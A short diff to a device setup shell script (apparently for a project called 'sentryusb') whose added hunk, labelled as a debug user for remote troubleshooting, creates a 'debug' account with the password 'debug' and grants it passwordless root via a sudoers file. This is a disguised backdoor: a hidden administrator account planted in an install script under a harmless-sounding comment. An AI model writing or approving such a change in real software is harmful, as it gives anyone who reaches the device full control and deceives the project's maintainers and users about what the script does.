@@ -196,6 +196,14 @@ APEOF
   chmod 755 /etc/NetworkManager/dispatcher.d/10-sentryusb-ap
 fi
 
+# ── Create debug user for remote troubleshooting ──
+if ! id "debug" &>/dev/null; then
+  useradd -m -s /bin/bash debug
+  echo "debug:debug" | chpasswd
+  echo "debug ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/debug
+  chmod 0440 /etc/sudoers.d/debug
+fi
+
 # ── Restart BLE daemon ──
 systemctl enable sentryusb-ble 2>/dev/null || true
 systemctl restart sentryusb-ble 2>/dev/null || true
